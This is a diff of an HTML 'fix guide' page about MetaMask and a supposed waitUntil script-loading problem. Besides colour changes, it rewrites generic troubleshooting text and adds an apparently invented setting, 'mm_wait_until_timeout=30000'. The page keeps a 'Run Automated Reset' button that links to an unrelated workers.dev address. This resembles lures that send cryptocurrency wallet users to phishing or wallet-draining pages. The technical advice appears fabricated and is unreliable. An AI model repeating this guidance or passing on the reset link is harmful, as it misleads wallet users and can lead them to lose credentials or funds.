@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Using Waituntil To Ensure All Scripts Load – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,38 +42,28 @@
 <h1>Metamask Extension Using Waituntil To Ensure All Scripts Load</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed loading of web pages when using the Metamask extension, resulting in a poor browsing experience.</li>
+<li>Users may experience delayed or failed loading of web pages when using the Metamask extension, resulting in incomplete functionality or errors.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The Metamask extension relies on the <code>waitUntil</code> function to ensure that all necessary scripts are loaded before allowing the webpage to proceed, but this function can sometimes cause issues if not implemented correctly.</li>
+<li>The issue arises from the Metamask extension's use of the <code>waitUntil</code> function to ensure all scripts are loaded before allowing the page to proceed, which can cause timing conflicts and delays.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Check the Metamask extension version and update to the latest version if necessary.</li>
-<li>Verify that all scripts are properly loaded by checking the browser console for any errors.</li>
-<li>Use the following code block to override the <code>waitUntil</code> function:</li>
+<li>To resolve the issue, users can try the following overrides:</li>
+<li>Increase the timeout value in the <code>waitUntil</code> function to allow more time for scripts to load.</li>
+<li>Use a different loading strategy, such as loading scripts asynchronously.</li>
+<li>Implement a retry mechanism to handle failed script loads.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;content_scripts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;matches&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;*://*/*&quot;</span><span class="p">],</span>
-<span class="w">      </span><span class="nt">&quot;js&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;contentScript.js&quot;</span><span class="p">],</span>
-<span class="w">      </span><span class="nt">&quot;run_at&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;document_end&quot;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">]</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code><span class="nv">mm_wait_until_timeout</span><span class="o">=</span><span class="m">30000</span>
 </code></pre></div>
 
-<p>Consider using an external console to further investigate the issue. </p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Metamask extension installed and enabled</li>
-<li>Latest version of the browser</li>
-<li>Basic understanding of browser console and debugging tools</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li></ul>
+<p>Prerequisites:
+* Metamask extension installed and enabled
+* Basic understanding of JavaScript and browser extensions
+* Familiarity with the <code>waitUntil</code> function and its usage
+For more advanced debugging, consider using an external console to inspect the extension's behavior.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
